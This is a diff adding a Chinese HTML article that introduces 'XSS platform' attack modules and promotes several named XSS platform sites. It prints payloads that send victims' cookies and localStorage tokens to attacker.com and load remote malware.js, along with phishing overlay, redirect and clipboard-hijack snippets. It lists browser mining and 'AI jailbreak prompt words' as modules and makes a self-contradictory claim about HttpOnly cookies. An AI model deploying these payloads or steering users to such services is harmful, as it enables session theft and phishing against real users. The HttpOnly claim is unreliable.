@@ -1,6 +1,245 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2026 XSS平台/xss平台/XSS 最新 平台常见功能模块介绍（2026 年视角）</title>
+	  <meta name="description" content="2026 年最新 XSS 平台功能模块详解，包括 Cookie 窃取、LocalStorage Token 获取、钓鱼跳转、动态 JS 加载等常见 payload 类型。仅供安全研究与防御学习使用，包含 XSS 测试平台推荐。">
+    <meta name="google-site-verification" content="catQ0SdCr1XZ02VcLFYOjR17Pg8FfOrajeyq0fRTLzg" />
+    <!-- keywords 标签：少量核心词，逗号分隔 -->
+    <meta name="keywords" content="XSS,XSS漏洞,XSS payload,XSS平台,XSS测试,跨站脚本攻击,Cookie窃取,LocalStorage Token,钓鱼跳转,Web安全,渗透测试">
+    
+    <!-- 可选：Open Graph / 社交分享优化 -->
+    <meta property="og:title" content="XSS 平台常见功能模块介绍（2026 年视角）">
+    <meta property="og:description" content="详解 XSS 常见模块：Cookie 窃取、钓鱼伪造、动态 JS 注入等，仅用于安全教育与研究。">
+    <meta property="og:type" content="article">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            line-height: 1.8;
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            background: #f8f9fa;
+            color: #212529;
+        }
+        h1 {
+            text-align: center;
+            color: #dc3545;
+            margin-bottom: 50px;
+        }
+        h2 {
+            color: #0d6efd;
+            border-bottom: 2px solid #0d6efd;
+            padding-bottom: 10px;
+            margin-top: 60px;
+        }
+        .module {
+            background: white;
+            border-radius: 10px;
+            padding: 24px;
+            margin: 24px 0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        .module h3 {
+            margin-top: 0;
+            color: #c82333;
+            font-size: 1.4em;
+        }
+        .payload {
+            background: #0d1117;
+            border-radius: 8px;
+            margin: 16px 0;
+            overflow: hidden;
+        }
+        .payload pre {
+            margin: 0;
+            padding: 16px;
+        }
+        .tags span {
+            background: #e9ecef;
+            color: #495057;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            margin-right: 8px;
+            margin-bottom: 8px;
+            display: inline-block;
+        }
+        .warning {
+            background: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 16px 20px;
+            margin: 30px 0;
+            border-radius: 6px;
+            color: #664d03;
+        }
+        footer {
+            text-align: center;
+            margin-top: 80px;
+            color: #6c757d;
+            font-size: 0.95em;
+        }
+    </style>
+</head>
 <body>
-<h1>Hello world666666!</h1>
+
+<h1>XSS平台 基础/常见功能模块介绍（2026 年视角）</h1>
+
+<div class="warning">
+    <strong>声明：</strong> 本文仅用于安全研究、漏洞分析与防御知识普及。文中提到的所有功能均为恶意利用场景，严禁用于任何未授权或非法行为。
+</div>
+<!-- 新增的推荐平台块，放在第一个模块上面 -->
+<div class="recommend">
+    <h3>推荐使用的 XSS 平台 / XSS 演示平台（2026 年视角）</h3>
+    <p>以下是一些常用于 XSS payload 测试、学习和演示的平台（均为公开、可访问的站点，适合安全研究与教育用途）：</p>
+    <ul>
+        <li><a href="https://xssaq.com" target="_blank" rel="noopener noreferrer">https://xssaq.com</a>  
+            （国内常用 XSS 测试/分享平台，支持多种 payload 演示）</li>
+        <li><a href="https://xss.li" target="_blank" rel="noopener noreferrer">https://xss.li</a>  
+            （轻量级 XSS 平台，常用于快速测试和 payload 存储）</li>
+        <li><a href="https://xssks.im" target="_blank" rel="noopener noreferrer">https://xssks.im</a>  
+            （XSS 相关工具/平台，适合学习和实验）</li>
+        <li><a href="https://xss.pt" target="_blank" rel="noopener noreferrer">https://xss.pt</a>  
+            （简洁的 XSS 测试站点，支持反射型和存储型演示）</li>
+        <li><strong><a href="http://www.nanhack.com/" target="_blank" rel="noopener noreferrer">http://www.nanhack.com/</a>：某女大佬搭建简单 PHP/Node 应用 + 反射型/存储型 XSS 环境（最安全、最可控）</li>
+    </ul>
+
+    <p>使用时请遵守法律法规，仅限于合法安全研究、CTF 练习或漏洞复现，严禁用于任何非法目的。</p>
+</div>
+
+
+<div class="module">
+    <h3>1. Cookie 窃取 / 获取 Cookie（最常见，占列表一半以上）</h3>
+    <p>核心目的：利用 XSS 在受害者浏览器中读取当前域的 <code>document.cookie</code>，并通过各种方式外发到攻击者控制的服务器。</p>
+    <div class="payload">
+<pre><code>// 经典低检测外发方式
+new Image().src = 'https://attacker.com/log?c=' + encodeURIComponent(document.cookie);
+
+// 或使用 fetch（POST 方式更隐蔽）
+fetch('https://attacker.com', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+});</code></pre>
+    </div>
+    <p><strong>代表条目：</strong></p>
+    <div class="tags">
+        <span>get cookie</span><span>Get Cookie</span><span>cookie读取</span><span>获取cooking</span><span>get_cookie</span>
+        <span>705 / 688 / 658 / 3655 / 3654 / 3613 / 3538 / 3420 / 3214 / 3695 等</span>
+    </div>
+    <p>热度极高，几乎是所有 XSS 平台最基础、最常被复制的模块。即使设置了 HttpOnly 的 cookie 也无法阻止 JS 读取（HttpOnly 只防 document.cookie 访问）。</p>
+</div>
+
+<div class="module">
+    <h3>2. LocalStorage / Token 窃取</h3>
+    <p>针对现代前端应用，JWT、Session Token、用户偏好等常存储在 localStorage / sessionStorage 中，XSS 可直接读取并外发。</p>
+    <div class="payload">
+<pre><code>const tokens = {};
+for (let i = 0; i < localStorage.length; i++) {
+  const key = localStorage.key(i);
+  tokens[key] = localStorage.getItem(key);
+}
+fetch('https://attacker.com', {
+  method: 'POST',
+  body: JSON.stringify(tokens)
+});</code></pre>
+    </div>
+    <p><strong>代表条目：</strong></p>
+    <div class="tags">
+        <span>get localStorage token</span><span>629 (neatsuki)</span>
+    </div>
+    <p>常与 Cookie 窃取结合使用，因为 HttpOnly Cookie 无法读取，但 Storage 完全暴露在 JS 上下文中。</p>
+</div>
+
+<div class="module">
+    <h3>3. 钓鱼 / 伪造页面 / 跳转钓鱼</h3>
+    <p>利用 XSS 修改 DOM 内容、弹出伪造登录框、定时跳转到克隆页面，或伪造系统提示（如证书错误、Flash 升级）来诱导用户输入凭证。</p>
+    <div class="payload">
+<pre><code>// 简单覆盖页面（概念示例）
+document.body.innerHTML = '&lt;h1&gt;登录已过期，请重新登录&lt;/h1&gt;&lt;iframe src="https://phish.com/login"&gt;&lt;/iframe&gt;';
+
+// 定时检测 + 跳转（概念示例）
+setInterval(() =&gt; {
+  if (/* 某些条件 */) location.href = 'https://phish.com';
+}, 600000); // 每10分钟</code></pre>
+    </div>
+    <p><strong>代表条目：</strong></p>
+    <div class="tags">
+        <span>伪造后台钓鱼模块</span><span>FLASH弹窗钓鱼</span><span>FLASH崩溃钓鱼</span><span>谷歌证书SSL钓鱼</span>
+        <span>自定义时间跳转到钓鱼网站</span><span>301暗链跳转</span><span>判断设备类型指定跳转</span>
+        <span>vran1 / 扬帆起航！ / 810978558 等</span>
+    </div>
+    <p>常结合 setInterval 实现周期性弹窗，提高成功率。</p>
+</div>
+
+<div class="module">
+    <h3>4. 自动复制 / 剪贴板操作</h3>
+    <p>在用户交互后自动将恶意链接、payload 或钓鱼地址写入剪贴板，诱导用户粘贴到聊天框、搜索栏等位置执行。</p>
+    <div class="payload">
+<pre><code>// 需要用户交互触发
+navigator.clipboard.writeText('https://phish.com/login?ref=' + encodeURIComponent(location.href))
+  .then(() =&gt; console.log('已复制'))
+  .catch(err =&gt; console.error('复制失败', err));</code></pre>
+    </div>
+    <p><strong>代表条目：</strong></p>
+    <div class="tags">
+        <span>自动复制文本</span><span>扬帆起航！3748</span>
+    </div>
+</div>
+
+<div class="module">
+    <h3>5. 动态加载外部 JS / 脚本注入</h3>
+    <p>通过创建 script 标签加载远程 JS，实现更复杂的多阶段攻击逻辑（窃取、挖矿、键盘记录等）。</p>
+    <div class="payload">
+<pre><code>const s = document.createElement('script');
+s.src = 'https://attacker.com/malware.js';
+document.head.appendChild(s);</code></pre>
+    </div>
+    <p><strong>代表条目：</strong></p>
+    <div class="tags">
+        <span>加载外部JS</span><span>动态执行JS</span><span>异步加载JS</span>
+        <span>810978558 / hacker108</span>
+    </div>
+</div>
+
+<div class="module">
+    <h3>6. 定时 / 延迟执行</h3>
+    <p>利用 setTimeout / setInterval 实现延迟触发、周期性行为（如反复窃取 cookie、定时弹窗、延迟跳转）。</p>
+    <div class="payload">
+<pre><code>// 每分钟执行一次
+setInterval(() =&gt; {
+  // 恶意逻辑
+}, 60000);</code></pre>
+    </div>
+    <p><strong>代表条目：</strong></p>
+    <div class="tags">
+        <span>定时执行代码</span><span>扬帆起航！3753</span>
+    </div>
+    <p>大量钓鱼模块依赖此机制来规避用户立即关闭页面的情况。</p>
+</div>
+
+<div class="module">
+    <h3>7. 其他功能模块</h3>
+    <ul>
+        <li><strong>音频播放 / 自动音乐播放</strong>：加载外链 MP3，制造噪音或作为行为掩盖（hh5051188、810978558）</li>
+        <li><strong>对联</strong>：页面装饰性挂件，常用于广告或视觉干扰</li>
+        <li><strong>获取所有元素并模拟点击</strong>：暴力触发页面所有可点击元素（扬帆起航！3769）</li>
+        <li><strong>XMR-Miner</strong>：浏览器挖矿脚本，利用受害者 CPU</li>
+        <li><strong>csrf + xss</strong>：组合利用，XSS 辅助完成 CSRF</li>
+        <li><strong>PDF中xss跳转</strong>：针对 PDF 阅读器中的 XSS 场景</li>
+        <li><strong>部分关键词绕过</strong>：针对特定平台的 WAF/过滤器绕过</li>
+        <li><strong>AI强力破甲词</strong>：非传统 XSS，用于绕过 AI 内容审查的提示工程</li>
+    </ul>
+</div>
+
+<footer>
+    <p>最后更新：2026 年 · 仅供安全研究与教育使用</p>
+    <p>防御关键：输出转义 + CSP + HttpOnly/SameSite Cookie + 避免危险 API（innerHTML / document.write / eval）</p>
+</footer>
+
 </body>
 </html>
